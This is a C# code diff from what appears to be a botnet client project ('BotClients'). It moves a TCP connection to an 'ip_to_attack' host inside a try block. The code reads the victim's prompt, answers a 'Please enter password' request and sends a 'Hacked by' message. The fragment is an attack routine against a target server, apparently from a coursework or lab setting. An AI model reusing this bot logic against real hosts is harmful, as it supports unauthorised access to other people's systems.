@@ -71,13 +71,14 @@ namespace BotClients
 
 			while (true)
 			{
-				TcpClient s = new TcpClient(new IPAddress(ip_to_attack).ToString(), BitConverter.ToUInt16(port_to_attack, 0));
-				IPAddress[] ipnew = Dns.GetHostAddresses(Dns.GetHostName());
-				//IPEndPoint ipEnd = new IPEndPoint(ipnew[1], BitConverter.ToUInt16(port_to_attack, 0));
-				NetworkStream ns = s.GetStream(); //networkstream is used to send/receive messages
-				byte[] buffer = new byte[256];
+               
 				try {
-					ns.Read(buffer, 0, buffer.Length);
+                    TcpClient s = new TcpClient(new IPAddress(ip_to_attack).ToString(), BitConverter.ToUInt16(port_to_attack, 0));
+                    IPAddress[] ipnew = Dns.GetHostAddresses(Dns.GetHostName());
+                    //IPEndPoint ipEnd = new IPEndPoint(ipnew[1], BitConverter.ToUInt16(port_to_attack, 0));
+                    NetworkStream ns = s.GetStream(); //networkstream is used to send/receive messages
+                    byte[] buffer = new byte[256];
+                    ns.Read(buffer, 0, buffer.Length);
 					string message = Encoding.Default.GetString(buffer);
 					//Console.Write("got from victim: " + message);
 					if (message.Contains("Please enter password"))
@@ -95,15 +96,16 @@ namespace BotClients
 						ns.Write(toSend, 0, toSend.Length);
 						//Console.Write("sent from victim: " + "Hacked by " + Encoding.Default.GetString(name_of_server) + "\r\n");
 					}
-				}
+                    s.Close();
+                    ns.Close();
+                    break;
+                }
 				catch (Exception)
 				{
 					Console.WriteLine("problem with victim con");
 				}
 			
-				s.Close();
-				ns.Close();
-				break;
+				
 			}
 		}
 
